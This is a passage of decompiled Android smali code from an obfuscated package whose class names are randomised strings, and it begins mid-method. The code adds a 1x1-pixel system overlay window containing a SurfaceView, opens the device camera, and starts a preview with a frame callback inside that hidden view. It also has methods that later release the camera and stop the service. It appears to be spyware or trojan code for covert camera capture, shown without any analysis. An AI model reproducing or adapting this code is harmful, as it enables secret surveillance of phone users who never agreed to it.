    invoke-direct/range {v7 .. v12}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->la_etepaejhucdoifemyubbjerbt16_y:Landroid/view/WindowManager$LayoutParams;

    goto :goto_0

    .line 92
    :cond_2
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v14, 0x1

    const/4 v15, 0x1

    const/16 v16, 0x7d6

    const/high16 v17, 0x40000

    const/16 v18, -0x3

    move-object v13, v1

    invoke-direct/range {v13 .. v18}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->la_etepaejhucdoifemyubbjerbt16_y:Landroid/view/WindowManager$LayoutParams;

    .line 99
    :goto_0
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->la_etepaejhucdoifemyubbjerbt16_y:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 100
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->w_etepaejhucdoifemyubbjerbt16_m:Landroid/view/WindowManager;

    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_fw:Landroid/view/SurfaceView;

    sget-object v5, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->la_etepaejhucdoifemyubbjerbt16_y:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 101
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_fw:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 102
    iget-object v1, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    aget-object v1, v1, v4

    iget-object v3, v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    aget-object v3, v3, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-virtual {v0, v1, v3}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->Completed_etepaejhucdoifemyubbjerbt16_App(Ljava/lang/String;I)V

    goto :goto_1

    .line 104
    :cond_3
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->sp()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_4
    :goto_1
    return v4

    :catch_0
    return v2
.end method

.method public p_etepaejhucdoifemyubbjerbt16_r()V
    .locals 2

    .line 453
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16$3;

    invoke-direct {v1, p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16$3;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 604
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public sp()V
    .locals 2

    .line 618
    :try_start_0
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 619
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    .line 620
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 621
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    .line 623
    :cond_0
    invoke-direct {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->di()V

    .line 624
    iget-boolean v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->usd:Z

    if-nez v0, :cond_1

    .line 625
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112wm:Landroid/view/WindowManager;

    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->s_etepaejhucdoifemyubbjerbt16_fw:Landroid/view/SurfaceView;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :cond_1
    const/4 v0, 0x0

    .line 627
    iput-boolean v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->usd:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 631
    :catch_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 632
    invoke-virtual {p0, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    .line 429
    sget-object p1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    if-eqz p1, :cond_0

    .line 430
    new-instance p2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16$2;

    invoke-direct {p2, p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16$2;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    :cond_0
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 7

    const-string v0, "continuous-video"

    .line 390
    :try_start_0
    iget-object v1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    const/4 v2, 0x0

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-static {v1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v1

    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    .line 393
    :catch_0
    :try_start_1
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v1

    const/4 v2, 0x0

    .line 395
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    invoke-virtual {v3}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v3

    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_1

    .line 396
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    invoke-virtual {v3}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v3

    .line 397
    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v3

    .line 398
    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    :goto_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/hardware/Camera$Size;

    .line 399
    iget v5, v4, Landroid/hardware/Camera$Size;->width:I

    const/16 v6, 0x258

    if-le v5, v6, :cond_0

    iget v5, v4, Landroid/hardware/Camera$Size;->height:I

    const/16 v6, 0x190

    if-le v5, v6, :cond_0

    move-object v2, v4

    goto :goto_0

    :cond_1
    if-nez v2, :cond_2

    const/16 v3, 0x280

    .line 406
    iput v3, v2, Landroid/hardware/Camera$Size;->width:I

    const/16 v3, 0x1e0

    .line 407
    iput v3, v2, Landroid/hardware/Camera$Size;->height:I

    .line 409
    :cond_2
    iget-object v3, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->vul:[Ljava/lang/String;

    const/4 v4, 0x4

    aget-object v3, v3, v4

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    const/4 v4, 0x1

    if-ne v3, v4, :cond_3

    .line 410
    invoke-virtual {v1}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v3

    .line 411
    invoke-interface {v3, v0}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 412
    invoke-virtual {v1, v0}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    .line 415
    :cond_3
    iget v0, v2, Landroid/hardware/Camera$Size;->width:I

    iget v2, v2, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v1, v0, v2}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const/16 v0, 0x11

    .line 416
    invoke-virtual {v1, v0}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    .line 417
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 418
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    .line 420
    sget-object p1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt16;->c_etepaejhucdoifemyubbjerbt16_m:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
